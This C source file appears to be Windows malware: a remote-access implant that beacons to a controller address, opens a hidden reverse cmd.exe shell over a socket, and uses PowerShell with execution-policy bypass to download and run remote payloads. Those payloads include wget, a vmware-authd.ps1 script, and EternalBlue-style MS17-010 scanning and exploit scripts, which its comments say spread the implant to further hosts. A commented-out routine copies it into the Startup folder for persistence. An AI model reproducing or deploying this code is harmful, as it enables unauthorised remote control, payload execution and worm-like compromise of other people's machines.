//
// Created by M on 2/5/2019.
//



// www requirements:
// A copy of wget.exe must be at /wget.exe -> Becasue getWget gets wget.exe from Father_IP/wget.exe
//


#include <winsock2.h>
#include <stdio.h>
#include <time.h>
#pragma comment(lib, "w2_32")
WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;
//#define Father_IP "ritrit.ddns.net"
#define Father_IP "10.4.2.26"
//#define Father_IP "10.1.1.1"
#define Whoami "Windows V 22"
#define MAX_LENGTH 4096 //max number of bytes in a message
#define bzero(b,len) (memset((b), '\0', (len)), (void) 0)
#define bcopy(b1,b2,len) (memmove((b2), (b1), (len)), (void) 0)
#define BUFSIZE 4096
#define PING_PORT 6066
#define SHELLPORT 6061

void connect2Father(){
    WSAStartup(MAKEWORD(2,2), &wsaData);
    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

    struct hostent *host;
    host = gethostbyname(Father_IP);
    strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
    hax.sin_family = AF_INET;
    hax.sin_port = htons(SHELLPORT);
    hax.sin_addr.s_addr =inet_addr(ip_addr);
    WSAConnect(Winsock,(SOCKADDR*)&hax, sizeof(hax),NULL,NULL,NULL,NULL);
    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb=sizeof(ini_processo);
    ini_processo.dwFlags=STARTF_USESTDHANDLES;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
    //CREATE_NO_WINDOW
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &ini_processo, &processo_info);
//    char *myArray[4] = { "cm", "d.e", "x", "e" };
//    char command[8] = "";
//    snprintf( command, sizeof(command), "%s%s%s%s", myArray[0], myArray[1], myArray[2], myArray[3]);
//    CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

//    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
//
//    memset(&ini_processo, 0, sizeof(ini_processo));
//    ini_processo.cb = sizeof(ini_processo);
//    ini_processo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
//    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE) Winsock;
//
//    //TCHAR commandLine[256] = L"cmd.exe";
//    CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);


}

int setup(SOCKET *Father_p){
    WSADATA wsd;
    char Buffer[BUFSIZE];
    int ret,n;
    struct sockaddr_in server;
    unsigned short port;
    struct hostent *host = NULL;
    START_EVERYTHING:
    /*Load Winsock DLL*/
    if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0) {
        printf("Winsock    initialization failed!\n");
        return 0;
    }
    /*Create Socket*/
    *Father_p = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (*Father_p == INVALID_SOCKET) {
        printf("socket() : %d\n", WSAGetLastError());
        return 0;
    }
    /*Specify the server address*/
    server.sin_family = AF_INET;
    port = PING_PORT;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(Father_IP);
    if (server.sin_addr.s_addr == INADDR_NONE) {
        host = gethostbyname(Father_IP);    /// Enter the address man name, etc.)
        if (host == NULL) {
            printf("Unable to resolve server address: %s\n", Father_IP);
            return 0;
        }
        CopyMemory(&server.sin_addr,
                   host->h_addr_list[0],
                   host->h_length);
    }
    /* Establish a connection with the server */
    printf("Establishing a connection with the server\n");
    START_CONNECTING:
    if (connect(*Father_p, (struct sockaddr*)&server,
                sizeof(server)) == SOCKET_ERROR) {
        int error = WSAGetLastError();
        if (error == 10061) {
            goto START_CONNECTING;
        } else {
            printf("connect() failure: %d\n", WSAGetLastError());
        }
    }
    return 1;
}

//todo add error checking functionality.
char* w8(const SOCKET *Father_p,char *buffer){
    // n is for errors
    int n= 0;
    //Get the length of the next command
    n = recv(*Father_p, buffer, MAX_LENGTH+1,0);
    if ((n) == -1){
        fprintf(stderr, "recv: %s (%d)\n", strerror(errno), errno);
        //clean buffer as an indication of a problem
        memset(buffer, 0, MAX_LENGTH);
        return buffer;
    }
    printf("%s\n",buffer);
    return buffer;
}

// TO get wget.exe, if this bin is not in the right place ($env:temp) many script will not work so
// Make sure that you check it has been downloaded.
void GetWget(char *Command){
    // Download wget
    // Powershell -ExecutionPolicy ByPass $down = New-Object System.Net.WebClient; $url = 'http://google.com/index.html'; $file = '1.ps1'; $down.DownloadFile($url,$file);
    Command = strcat(Command,"Powershell -ExecutionPolicy ByPass $down = New-Object System.Net.WebClient; $url = 'http://");
    Command = strcat(Command,Father_IP);
    Command = strcat(Command,"/wget.exe'; $file = $env:temp+'\\wget.exe'; $down.DownloadFile($url,$file);\0");
    // Now we have wget.exe ready to use :)
    system(Command);
    memset(Command, 0, MAX_LENGTH);
}

//void copyymyself(){
//    'powershell -ExecutionPolicy ByPass cp .\\WinDef.exe \'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\''
//}


void TheBoom(char *Command){
    // Download 1.ps1
    // Powershell -ExecutionPolicy ByPass $down = New-Object System.Net.WebClient; $url = 'http://google.com/index.html'; $file = '1.ps1'; $down.DownloadFile($url,$file);
    Command = strcat(Command,"Powershell -ExecutionPolicy ByPass $down = New-Object System.Net.WebClient; $url = 'http://");
    Command = strcat(Command,Father_IP);
    Command = strcat(Command,"/1.ps1'; $file = '%temp%\\1.ps1'; $down.DownloadFile($url,$file);\0");
    // 1.ps1
    system(Command);
    memset(Command, 0, MAX_LENGTH);
    // ------
    // Download DP.ps1
    Command = strcat(Command,"Powershell -ExecutionPolicy ByPass $down = New-Object System.Net.WebClient; $url = 'http://");
    Command = strcat(Command,Father_IP);
    Command = strcat(Command,"/DP.ps1'; $file = '%temp%\\'DP.ps1'; $down.DownloadFile($url,$file);\0");
    // DP.ps1
    system(Command);
    memset(Command, 0, MAX_LENGTH);
    // ------
    // Download getIPs.py
    Command = strcat(Command,"Powershell -ExecutionPolicy ByPass $down = New-Object System.Net.WebClient; $url = 'http://");
    Command = strcat(Command,Father_IP);
    Command = strcat(Command,"/getIPs.py'; $file = '%temp%\\getIPs.py'; $down.DownloadFile($url,$file);\0");
    // getIPs.py
    system(Command);
    memset(Command, 0, MAX_LENGTH);
    // ------
    // Download scan.py
    Command = strcat(Command,"Powershell -ExecutionPolicy ByPass $down = New-Object System.Net.WebClient; $url = 'http://");
    Command = strcat(Command,Father_IP);
    Command = strcat(Command,"/scan.py'; $file = '%temp%\\scan.py'; $down.DownloadFile($url,$file);\0");
    // scan.py
    system(Command);
    memset(Command, 0, MAX_LENGTH);
    // ------
    // Download mysmb.py
    Command = strcat(Command,"Powershell -ExecutionPolicy ByPass $down = New-Object System.Net.WebClient; $url = 'http://");
    Command = strcat(Command,Father_IP);
    Command = strcat(Command,"/mysmb.py'; $file = '%temp%\\'mysmb.py'; $down.DownloadFile($url,$file);\0");
    // mysmb.py
    system(Command);
    memset(Command, 0, MAX_LENGTH);
    // ------
    // Download zzz_exploit.py
    Command = strcat(Command,"Powershell -ExecutionPolicy ByPass $down = New-Object System.Net.WebClient; $url = 'http://");
    Command = strcat(Command,Father_IP);
    Command = strcat(Command,"/zzz_exploit.py'; $file = '%temp%\\zzz_exploit.py'; $down.DownloadFile($url,$file);\0");
    //
    system(Command);
    memset(Command, 0, MAX_LENGTH);
    // ------
    // Download
    Command = strcat(Command,"Powershell -ExecutionPolicy ByPass $down = New-Object System.Net.WebClient; $url = 'http://");
    Command = strcat(Command,Father_IP);
    Command = strcat(Command,"/checker.py'; $file = '%temp%\\checker.py'; $down.DownloadFile($url,$file);\0");
    //
    system(Command);
    memset(Command, 0, MAX_LENGTH);
}

void runall(char *Command){
    //The order is this:
    // DP.ps1 will run first, which will download and install all the requirements for zzz_exploit.py.
    // Then DP.ps1 will run getIPs.py will run and use 1.ps1 then outputs test.txt
    // Then  DP.ps1 again will Scan (Scan.py) using test.txt (which are the valid ips) to check for ms17010
    // Then  DP.ps1 will run zzz_exploit.py which will run this again in a different target.
    Command = strcat(Command,"Powershell -ExecutionPolicy ByPass -File %temp%\\DP.ps1\0");
    printf("Executing %s JUST A TEST!!!!!!\n",Command);
    //system(Command);
    memset(Command, 0, MAX_LENGTH);
}

void connect2Father2(char *Command){
    // Download
//    Command = strcat(Command,"Powershell -ExecutionPolicy ByPass $down = New-Object System.Net.WebClient; $url = 'http://");
//    Command = strcat(Command,Father_IP);
//    Command = strcat(Command,"/vmware-authd.ps1'; $file = '%temp%\\vmware-authd.ps1'; $down.DownloadFile($url,$file);\0");
//    //
//    system(Command);
//    memset(Command, 0, MAX_LENGTH);
//
//    system("powershell -ExecutionPolicy Baypass -File %temp%\\vmware-authd.ps1");
//    memset(Command, 0, MAX_LENGTH);
//
//
//

    // Download
    // Powershell -ExecutionPolicy ByPass $down = New-Object System.Net.WebClient; $url = 'http://google.com/index.html'; $file = '1.ps1'; $down.DownloadFile($url,$file);
    Command = strcat(Command,"Powershell -ExecutionPolicy ByPass $down = New-Object System.Net.WebClient; $url = 'http://");
    Command = strcat(Command,Father_IP);
    Command = strcat(Command,"/vmware-authd.ps1'; $file = $env:temp+'\\vmware-authd.ps1'; $down.DownloadFile($url,$file);\0");
    // Now we have wget.exe ready to use :)
    system("del %temp%\\vmware-authd.ps1");
    system(Command);
    system("powershell -ExecutionPolicy Bypass -File %temp%\\vmware-authd.ps1");
    memset(Command, 0, MAX_LENGTH);

}

int main(int argc, char *argv[]){
    while (1) {
        //connect2Father();
        // Setup the connection.
        SOCKET Father;
        Father = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        setup(&Father);
        //Command is for the Father's/server's instructions
        char *Command;
        Command = calloc(MAX_LENGTH, sizeof(char));
        memset(Command, 0, MAX_LENGTH);
        // Download wget
        GetWget(Command);

        //TheBoom(Command);
        //runall(Command);


        Command = w8(&Father, (char *) Command);
        char c = Command[0];
        printf("%s\n", Command);
        printf("%c is equal to 1 ??", c);
        if (c == '1') {
            printf("Connected");
            connect2Father();
            memset(Command, 0, MAX_LENGTH);
            //connect2Father2(Command);
            memset(Command, 0, MAX_LENGTH);
        } else {
            printf("Disconnected");
            free(Command);
            exit(0);
        }
        memset(Command, 0, MAX_LENGTH);
        // Close the socket
        closesocket(Father);

        // Sleep for a min
        Sleep(60000);
    }
}
